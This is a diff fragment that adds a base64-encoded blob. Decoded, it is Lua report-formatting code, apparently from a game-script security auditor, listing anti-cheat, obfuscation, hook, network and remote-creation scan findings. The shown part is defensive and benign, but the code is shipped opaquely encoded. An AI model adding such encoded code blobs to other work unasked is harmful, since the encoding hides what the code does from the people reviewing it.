+'I3IudnVsbnMgLi4gIiB2dWxucylcbiIKICAgIHBbI3ArMV0gPSAiw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3C',
+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBXG4iCiAgICBpZiAjci52dWxucyA9PSAwIHRoZW4gcFsjcCsxXSA9ICIgIChub25lKVxuIiBlbHNlCiAgICAgICAgbG9jYWwgb3JkZXIgPSB7',
+'IENSSVRJQ0FMID0gMSwgSElHSCA9IDIsIE1FRElVTSA9IDMsIExPVyA9IDQgfQogICAgICAgIHRhYmxlLnNvcnQoci52dWxucywgZnVuY3Rpb24oYSwgYikg',
+'cmV0dXJuIChvcmRlclthLmx2bF0gb3IgNSkgPCAob3JkZXJbYi5sdmxdIG9yIDUpIGVuZCkKICAgICAgICBmb3IgXywgdiBpbiBpcGFpcnMoci52dWxucykg',
+'ZG8KICAgICAgICAgICAgbG9jYWwgdGFnID0gIiIKICAgICAgICAgICAgaWYgdi5sdmwgPT0gIkNSSVRJQ0FMIiB0aGVuIHRhZyA9ICIgWyEhIV0iIGVuZAog',
+'ICAgICAgICAgICBwWyNwKzFdID0gc3RyaW5nLmZvcm1hdCgiICBbJXMlc10gJXMgIChzY29yZT0lZClcbiIsIHYubHZsLCB0YWcsIHYuZGVzYywgdi5zY3Ig',
+'b3IgMCkKICAgICAgICAgICAgaWYgdi5wYXRoIHRoZW4gcFsjcCsxXSA9ICIgICAgICAgIiAuLiB2LnBhdGggLi4gIlxuIiBlbmQKICAgICAgICBlbmQKICAg',
+'IGVuZAogICAgcFsjcCsxXSA9ICJcbiIKCiAgICBsb2NhbCBhc0FyciA9IHt9CiAgICBmb3IgayBpbiBwYWlycyhyLmFzc2V0SURzKSBkbyBhc0FyclsjYXNB',
+'cnIrMV0gPSBrIGVuZDsgdGFibGUuc29ydChhc0FycikKICAgIHBbI3ArMV0gPSAiw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3C',
+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKA',
+'ncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBXG4iCiAgICBwWyNwKzFdID0gIiBBU1NFVCBDQVRFR09SSVpBVElPTiAgKCIgLi4gI2FzQXJyIC4uICIgYXNzZXRzLCAiIC4u',
+'ICNyLmFzc2V0Q3R4IC4uICIgY3R4IHJlZnMpXG4iCiAgICBwWyNwKzFdID0gIsOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3C',
+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgVxuIgogICAgaWYgI2FzQXJyID4gMCB0aGVuCiAgICAgICAgcFsjcCsxXSA9ICIgIElEcyAoaWxrIDUwKTpcbiIKICAgICAgICBs',
+'b2NhbCBtYXggPSBtYXRoLm1pbigjYXNBcnIsIDUwKQogICAgICAgIGZvciBpID0gMSwgbWF4IGRvIHBbI3ArMV0gPSAiICAgICIgLi4gYXNBcnJbaV0gLi4g',
+'IlxuIiBlbmQKICAgICAgICBpZiAjYXNBcnIgPiA1MCB0aGVuIHBbI3ArMV0gPSAiICAgIC4uLiArIiAuLiAoI2FzQXJyIC0gNTApIC4uICIgbW9yZVxuIiBl',
+'bmQKICAgIGVuZAogICAgaWYgI3IuYXNzZXRDdHggPiAwIHRoZW4KICAgICAgICBwWyNwKzFdID0gIiAgQ29udGV4dCAoIiAuLiAjci5hc3NldEN0eCAuLiAi',
+'KTpcbiIKICAgICAgICBsb2NhbCBtYXggPSBtYXRoLm1pbigjci5hc3NldEN0eCwgMzApCiAgICAgICAgZm9yIGkgPSAxLCBtYXggZG8gcFsjcCsxXSA9ICIg',
+'ICAgIiAuLiByLmFzc2V0Q3R4W2ldIC4uICJcbiIgZW5kCiAgICAgICAgaWYgI3IuYXNzZXRDdHggPiAzMCB0aGVuIHBbI3ArMV0gPSAiICAgIC4uLiArIiAu',
+'LiAoI3IuYXNzZXRDdHggLSAzMCkgLi4gIiBtb3JlXG4iIGVuZAogICAgZW5kCiAgICBpZiAjYXNBcnIgPT0gMCBhbmQgI3IuYXNzZXRDdHggPT0gMCB0aGVu',
+'IHBbI3ArMV0gPSAiICAobm9uZSlcbiIgZW5kCiAgICBwWyNwKzFdID0gIlxuIgoKICAgIHBbI3ArMV0gPSAiw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3C',
+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKA',
+'ncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBXG4iCiAgICBwWyNwKzFdID0gIiBBTlRJLUNIRUFUIFBBVFRFUk4gU0NBTk5FUiAgKCIgLi4gI3Iu',
+'YW50aUNoZWF0IC4uICIgZmluZGluZ3MpXG4iCiAgICBwWyNwKzFdID0gIsOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKA',
+'ncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgVxuIgogICAgaWYgI3IuYW50aUNoZWF0ID09IDAgdGhlbiBwWyNwKzFdID0gIiAgKG5vbmUpXG4iIGVsc2UKICAgICAgICBmb3IgXywg',
+'diBpbiBpcGFpcnMoci5hbnRpQ2hlYXQpIGRvCiAgICAgICAgICAgIHBbI3ArMV0gPSBzdHJpbmcuZm9ybWF0KCIgIFslc10gJXNcbiIsIHYubHZsLCB2LmRl',
+'c2MpCiAgICAgICAgICAgIGlmIHYucGF0aCB0aGVuIHBbI3ArMV0gPSAiICAgICAgICIgLi4gdi5wYXRoIC4uICJcbiIgZW5kCiAgICAgICAgZW5kCiAgICBl',
+'bmQKICAgIHBbI3ArMV0gPSAiXG4iCgogICAgcFsjcCsxXSA9ICLDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3C',
+'gcOi4oCdwoFcbiIKICAgIHBbI3ArMV0gPSAiIE9CRlVTQ0FUSU9OIFNDQU5ORVIgICgiIC4uICNyLm9iZnVzY2F0aW9uIC4uICIgZmluZGluZ3MpXG4iCiAg',
+'ICBwWyNwKzFdID0gIsOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3C',
+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKA',
+'ncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgVxuIgogICAgaWYgI3Iub2Jm',
+'dXNjYXRpb24gPT0gMCB0aGVuIHBbI3ArMV0gPSAiICAobm9uZSlcbiIgZWxzZQogICAgICAgIGZvciBfLCB2IGluIGlwYWlycyhyLm9iZnVzY2F0aW9uKSBk',
+'bwogICAgICAgICAgICBwWyNwKzFdID0gc3RyaW5nLmZvcm1hdCgiICBbJXNdICVzXG4iLCB2Lmx2bCwgdi5kZXNjKQogICAgICAgICAgICBpZiB2LnBhdGgg',
+'dGhlbiBwWyNwKzFdID0gIiAgICAgICAiIC4uIHYucGF0aCAuLiAiXG4iIGVuZAogICAgICAgIGVuZAogICAgZW5kCiAgICBwWyNwKzFdID0gIlxuIgoKICAg',
+'IHBbI3ArMV0gPSAiw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3C',
+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBXG4iCiAgICBwWyNwKzFdID0g',
+'IiBIT09LIC8gRU5WSVJPTk1FTlQgREVURUNUSU9OICAoIiAuLiAjci5ob29rcyAuLiAiIGZpbmRpbmdzKVxuIgogICAgcFsjcCsxXSA9ICLDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3C',
+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoFcbiIKICAgIGlmICNyLmhvb2tzID09IDAgdGhlbiBwWyNwKzFdID0g',
+'IiAgKG5vbmUpXG4iIGVsc2UKICAgICAgICBmb3IgXywgdiBpbiBpcGFpcnMoci5ob29rcykgZG8KICAgICAgICAgICAgcFsjcCsxXSA9IHN0cmluZy5mb3Jt',
+'YXQoIiAgWyVzXSAlc1xuIiwgdi5sdmwsIHYuZGVzYykKICAgICAgICAgICAgaWYgdi5wYXRoIHRoZW4gcFsjcCsxXSA9ICIgICAgICAgIiAuLiB2LnBhdGgg',
+'Li4gIlxuIiBlbmQKICAgICAgICBlbmQKICAgIGVuZAogICAgcFsjcCsxXSA9ICJcbiIKCiAgICBwWyNwKzFdID0gIsOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3C',
+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgVxuIgogICAgcFsjcCsxXSA9ICIgTkVUV09SSyAmIFBIWVNJQ1MgQVVESVRcbiIKICAgIHBb',
+'I3ArMV0gPSAiw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKA',
+'ncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBXG4iCiAgICBsb2NhbCBuYUNvdW50',
+'ID0gI3IubmV0d29ya0F1ZGl0CiAgICBwWyNwKzFdID0gc3RyaW5nLmZvcm1hdCgiICBVbmFuY2hvcmVkIHBhcnRzOiAlZFxuICBOZXR3b3JrIGZpbmRpbmdz',
+'OiAlZFxuIiwgci51bmFuY2hvcmVkIG9yIDAsIG5hQ291bnQpCiAgICBpZiBuYUNvdW50ID4gMCB0aGVuCiAgICAgICAgZm9yIF8sIHYgaW4gaXBhaXJzKHIu',
+'bmV0d29ya0F1ZGl0KSBkbyBwWyNwKzFdID0gIiAgPiAiIC4uIHYgLi4gIlxuIiBlbmQKICAgIGVuZAogICAgcFsjcCsxXSA9ICJcbiIKCiAgICBwWyNwKzFd',
+'ID0gIsOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3C',
+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgVxuIgogICAgcFsjcCsxXSA9ICIgRVhURVJO',
+'QUwgQ09OTkVDVElPTiBTQ0FOTkVSICAoIiAuLiAjci5leHRDb25ucyAuLiAiIGNvbm5lY3Rpb25zKVxuIgogICAgcFsjcCsxXSA9ICLDouKAncKBw6LigJ3C',
+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKA',
+'ncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoFcbiIKICAgIGlmICNyLmV4dENvbm5zID09IDAgdGhlbiBwWyNwKzFdID0g',
+'IiAgKG5vbmUpXG4iIGVsc2UKICAgICAgICBmb3IgXywgdiBpbiBpcGFpcnMoci5leHRDb25ucykgZG8gcFsjcCsxXSA9ICIgID4gIiAuLiB2IC4uICJcbiIg',
+'ZW5kCiAgICBlbmQKICAgIHBbI3ArMV0gPSAiXG4iCgogICAgaWYgci5yZW1vdGVDcmVhdGlvbnMgYW5kICNyLnJlbW90ZUNyZWF0aW9ucyA+IDAgdGhlbgog',
+'ICAgICAgIHBbI3ArMV0gPSAiw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3C',
+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBXG4iCiAgICAgICAg',
+'cFsjcCsxXSA9ICIgUkVNT1RFIENSRUFUSU9OIERFVEVDVElPTiAgKCIgLi4gI3IucmVtb3RlQ3JlYXRpb25zIC4uICIgaW5zdGFuY2VzKVxuIgogICAgICAg',
+'IHBbI3ArMV0gPSAiw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3C',
+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCd',
+'woHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBXG4iCiAgICAgICAgZm9yIF8s',
+'IHJjIGluIGlwYWlycyhyLnJlbW90ZUNyZWF0aW9ucykgZG8KICAgICAgICAgICAgcFsjcCsxXSA9IHN0cmluZy5mb3JtYXQoIiAgPiBJbnN0YW5jZS5uZXco',
+'XCIlc1wiKSAtPiB2YXI6ICVzLCB0eXBlOiAlc1xuIiwgcmMuY2xhc3MsIHJjLnZhciwgcmMudHlwZSkKICAgICAgICBlbmQKICAgICAgICBwWyNwKzFdID0g',
+'IlxuIgogICAgZW5kCgogICAgaWYgci5zaGFyZWRWYXJzIGFuZCAjci5zaGFyZWRWYXJzID4gMCB0aGVuCiAgICAgICAgcFsjcCsxXSA9ICLDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3C',
+'gcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoFcbiIKICAgICAgICBwWyNwKzFdID0gIiBfRyAvIFNIQVJFRCBWQVJJ',
+'QUJMRSBUUkFDS0lORyAgKCIgLi4gI3Iuc2hhcmVkVmFycyAuLiAiIGFjY2Vzc2VzKVxuIgogICAgICAgIHBbI3ArMV0gPSAiw6LigJ3CgcOi4oCdwoHDouKA',
+'ncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6Li',
+'gJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi',
+'4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHD',
+'ouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKB',
+'w6LigJ3CgcOi4oCdwoHDouKAncKBw6LigJ3CgcOi4oCdwoHDouKAncKBXG4iCiAgICAgICAgbG9jYWwgd3JpdGVzID0ge307IGxvY2FsIHJlYWRzID0ge30K',
+'ICAgICAgICBmb3IgXywgc3YgaW4gaXBhaXJzKHIuc2hhcmVkVmFycykgZG8KICAgICAgICAgICAgaWYgc3YudHlwZSA9PSAid3JpdGUiIHRoZW4gd3JpdGVz',
+'WyN3cml0ZXMrMV0gPSBzdiBlbHNlIHJlYWRzWyNyZWFkcysxXSA9IHN2IGVuZAogICAgICAgIGVuZAogICAgICAgIGlmICN3cml0ZXMgPiAwIHRoZW4KICAg',
+'ICAgICAgICAgcFsjcCsxXSA9ICIgIFdyaXRlcyAoIiAuLiAjd3JpdGVzIC4uICIpOlxuIgogICAgICAgICAgICBmb3IgXywgc3YgaW4gaXBhaXJzKHdyaXRl',
+'cykgZG8KICAgICAgICAgICAgICAgIHBbI3ArMV0gPSBzdHJpbmcuZm9ybWF0KCIgICAgJXMgPSAlc1xuIiwgc3YudmFyLCBzdi5zbmlwcGV0IG9yICI/IikK',
+'ICAgICAgICAgICAgZW5kCiAgICAgICAgZW5kCiAgICAgICAgaWYgI3JlYWRzID4gMCB0aGVuCiAgICAgICAgICAgIHBbI3ArMV0gPSAiICBSZWFkcyAoIiAu',
+'LiAjcmVhZHMgLi4gIik6XG4iCiAgICAgICAgICAgIGxvY2FsIHNlZW4gPSB7fQogICAgICAgICAgICBmb3IgXywgc3YgaW4gaXBhaXJzKHJlYWRzKSBkbwog',
